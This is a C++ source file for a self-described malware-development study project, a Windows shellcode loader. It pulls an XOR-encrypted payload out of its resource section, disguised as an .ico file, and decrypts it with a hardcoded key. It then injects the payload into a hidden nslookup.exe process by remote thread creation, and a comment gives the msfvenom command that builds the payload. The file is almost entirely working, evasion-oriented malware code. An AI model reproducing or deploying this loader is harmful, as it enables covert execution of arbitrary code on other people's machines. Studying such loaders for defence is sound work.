/*
	Akatsuki is a study project to learn more about malware development.
	Resources:
		- https://maldevacademy.com/
		- https://cocomelonc.github.io/
*/


// Payload:
// msfvenom -a x64 -p windows/x64/exec CMD=calc.exe --encrypt xor --encrypt-key <pasword> -f raw > image.ico
// Insert the image.ico into .rsrc as RCDATA

#include <Windows.h>
#include <string>
#include <stdio.h>
#include <tuple>
#include "resource.h"
using namespace std;

const char key[] = "S3cr3t";
const LPCWSTR target = L"C:\\Windows\\System32\\nslookup.exe";


HANDLE CreateTargetProcess(LPCWSTR procname)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&si, sizeof(pi));

	CreateProcessW(
		procname,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi
	);
	WaitForSingleObject(pi.hProcess, 1000);

	return pi.hProcess;
}


tuple <PVOID, SIZE_T> GetRsrc(void)
{
	HRSRC hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA2), RT_RCDATA);
	PVOID pPayloadAddress = LockResource(LoadResource(NULL, hRsrc));
	SIZE_T sPayloadSize = SizeofResource(NULL, hRsrc);
	
	return make_tuple(pPayloadAddress, sPayloadSize);
}


PVOID CopyPayload(PVOID pAddrToPayload, SIZE_T sPayloadSize)
{
	PVOID pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
	if (pBuffer != nullptr)
	{
		memcpy(pBuffer, pAddrToPayload, sPayloadSize);
	}
	return pBuffer;
}


void Xor(char* pShellcode, size_t sShellcodeSize, char* bKey, size_t sKeySize)
{
	int j = 0;
	for (int i = 0; i < sShellcodeSize; i++)
	{
		if (j == sKeySize - 1) j = 0;
		pShellcode[i] = pShellcode[i] ^ bKey[j];
		j++;
	}
}


void PayloadInject(LPCVOID payload, size_t sPayloadSize)
{
	PVOID buffer;
	DWORD oldprotect;
	BOOL exec_mem;
	HANDLE rt;

	HANDLE hTargetProc = CreateTargetProcess(target);

	buffer = VirtualAllocEx(hTargetProc, NULL, sPayloadSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

	WriteProcessMemory(hTargetProc, buffer, payload, sPayloadSize, NULL);

	exec_mem = VirtualProtectEx(hTargetProc, buffer, sPayloadSize, PAGE_EXECUTE_READ, &oldprotect);

	if (exec_mem != 0)
	{
		rt = CreateRemoteThread(hTargetProc, NULL, NULL, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
		CloseHandle(hTargetProc);
	}
}


int main(void)
{
	PVOID pPayloadAddr = nullptr;
	SIZE_T sSizeofPayload = 0;
	PVOID pNewBuffer = nullptr;

	tie(pPayloadAddr, sSizeofPayload) = GetRsrc();

	pNewBuffer = CopyPayload(pPayloadAddr, sSizeofPayload);

	Xor((char*)pNewBuffer, sSizeofPayload, (char*)key, sizeof(key));

	PayloadInject(pNewBuffer, sSizeofPayload);

	return EXIT_SUCCESS;
}
